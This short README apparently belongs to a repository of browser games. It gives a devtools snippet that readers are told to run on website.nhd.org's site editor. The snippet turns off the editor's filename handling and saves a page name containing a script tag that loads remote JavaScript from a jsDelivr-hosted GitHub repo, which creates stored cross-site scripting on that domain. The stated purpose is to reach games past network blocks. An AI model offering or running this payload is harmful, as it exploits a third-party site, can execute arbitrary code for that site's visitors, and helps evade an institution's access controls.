Go to https://website.nhd.org make a new site and run dis in devtools for xss!!!1!11!
```
editor.ToFileName = src => src; document.getElementById("new-page-name").value = '<script src="https://cdn.jsdelivr.net/gh/ioB-ybbolB/Blobe-Games@master/loader.js"></script>'; editor.Page.Save(this);
```
* Running ``index.html`` standalone will just make most games fail to load since they must be run on http:// (data doesnt work either)
* If github pages still aren't blocked for u for some reason then just go to [this link](https://ioB-ybbolB.github.io/Blobe-Games/)
